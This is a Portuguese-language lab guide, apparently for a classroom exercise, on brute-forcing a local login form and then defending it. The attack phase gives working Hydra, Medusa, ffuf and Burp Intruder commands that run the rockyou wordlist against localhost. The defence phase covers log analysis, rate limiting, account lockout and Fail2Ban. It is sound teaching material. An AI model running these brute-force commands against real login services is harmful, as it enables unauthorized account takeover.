// 03 · Ataque

Fase 1 — Red Team

⚔️

Você é o atacante

Use as ferramentas abaixo em ordem. Cada uma revela algo diferente sobre a vulnerabilidade.

1. Reconhecimento com curl

Antes de qualquer ataque, entenda como a aplicação responde. Isso define o fail string — a string que indica login falho.

curl — teste de login inválido 
curl -s -X POST http://localhost:3000/login \
  -d 'username=admin&password=senhaerrada' \
  -w '\nHTTP Status: %{http_code}\n'
O que observar:
  • Qual texto aparece quando a senha é errada? (ex: "Credenciais inválidas.")
  • Qual o status HTTP? (401 = não autorizado)
  • Anote o texto exato — ele será o F_STRING do Hydra

2. Ataque com Hydra

Substitua FAIL_STRING pelo texto de erro que você anotou na etapa anterior.

hydra — bruteforce HTTP POST 
hydra \
  -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  localhost \
  http-post-form '/login:username=^USER^&password=^PASS^:FAIL_STRING' \
  -t 4 -V -f
ParâmetroSignificado
-l adminUsuário fixo a testar
-P rockyou.txtWordlist de senhas
^USER^ ^PASS^Placeholders substituídos pelo Hydra a cada tentativa
FAIL_STRINGTexto que indica login FALHO (usado para detectar sucesso por exclusão)
-t 44 threads paralelas
-VVerbose: mostra cada tentativa
-fPara ao encontrar a primeira senha válida

3. Comparativo com Medusa

medusa — bruteforce HTTP 
medusa \
  -h localhost \
  -u admin \
  -P /usr/share/wordlists/rockyou.txt \
  -M web-form \
  -m 'FORM:/login:username=^USER^&password=^PASS^:FAIL_STRING' \
  -t 2 -v 6 -f

4. Burp Suite — Intruder

Abra o Burp Suite → Proxy → Intercept ON

Configure o navegador: proxy manual 127.0.0.1:8080

Faça um login qualquer → a requisição será capturada → Action → Send to Intruder

Na aba Positions, selecione o valor da senha e clique em Add §:

username=admin&password=§senha§

Em Payloads → Simple list → carregue as primeiras 200 linhas do rockyou.txt → Start Attack

Ordene pela coluna Length — a senha correta terá comprimento diferente das demais.

✓ Dica

Quando o login é bem-sucedido, o servidor retorna uma resposta maior (com mais dados) ou redireciona — isso muda o tamanho (Length) da resposta HTTP.

5. ffuf — Fuzzing rápido

ffuf — web fuzzer 
ffuf \
  -w /usr/share/wordlists/rockyou.txt:FUZZ \
  -u http://localhost:3000/login \
  -X POST \
  -d 'username=admin&password=FUZZ' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -fr 'FAIL_STRING' \
  -t 10 -mc all

6. Wireshark — captura do tráfego

Abra o Wireshark → selecione interface loopback (lo)

Aplique o filtro:

tcp.port == 3000 && http

Execute o Hydra por 30 segundos enquanto observa os pacotes. Você consegue ver as senhas testadas em texto claro?

// 04 · Defesa

Fase 2 — Blue Team

🛡️

Você é o defensor

Analise os logs, identifique o ataque e ative as contramedidas uma a uma. Depois, tente atacar novamente.

1. Análise dos Logs

O container registra todos os acessos em /app/logs/access.log, mapeado para ./logs/ no host.

analisando logs do container 
# Visualizar logs em tempo real
docker logs app-brute --tail 100 --follow

# Contar tentativas POST /login por IP
grep 'POST /login' ./logs/access.log \
  | awk '{print $1}' \
  | sort | uniq -c | sort -rn

# Ver User-Agents usados
grep 'POST /login' ./logs/access.log \
  | awk -F'"' '{print $6}' | sort -u

2. Ativando Rate Limiting

Limite o número de requisições por IP em uma janela de tempo.

ativar rate limiting via API 
# Ativar (máximo 20 req/minuto por IP)
curl -X POST http://localhost:3000/config \
  -d 'feature=rateLimit&value=true'

# Ajustar para apenas 5 req/minuto (mais restritivo)
curl -X POST http://localhost:3000/config \
  -d 'feature=maxReqs&value=5'

# Verificar configuração atual
curl http://localhost:3000/status
💡 Teste:

Rode o Hydra novamente após ativar o rate limiting. Ele vai começar a receber erros 429 Too Many Requests. O ataque ainda funciona? Por quê?

3. Ativando Account Lockout

ativar lockout de conta 
# Ativar (bloqueia após 5 falhas por 5 minutos)
curl -X POST http://localhost:3000/config \
  -d 'feature=lockout&value=true'

# Testar manualmente (6 tentativas seguidas)
for i in 1 2 3 4 5 6; do
  curl -s -X POST http://localhost:3000/login \
    -d "username=admin&password=errada_$i" \
    -w "Tentativa $i: HTTP %{http_code}\n"
done
⚠ Tradeoff importante

O lockout pode ser usado em ataques de negação de serviço (DoS) — um atacante pode bloquear contas legítimas de propósito. Discuta como mitigar isso.

4. Configurando Fail2Ban

fail2ban — bloqueio automático de IP 
# Criar filtro para a aplicação
sudo nano /etc/fail2ban/filter.d/app-brute.conf

[Definition]
failregex = ^<HOST> .* POST /login .* 401
ignoreregex =

# Criar jail
sudo nano /etc/fail2ban/jail.d/app-brute.conf

[app-brute]
enabled  = true
filter   = app-brute
logpath  = /home/aluno/lab-bruteforce/logs/access.log
maxretry = 10
bantime  = 600
findtime = 60

# Reiniciar e verificar
sudo systemctl restart fail2ban
fail2ban-client status app-brute
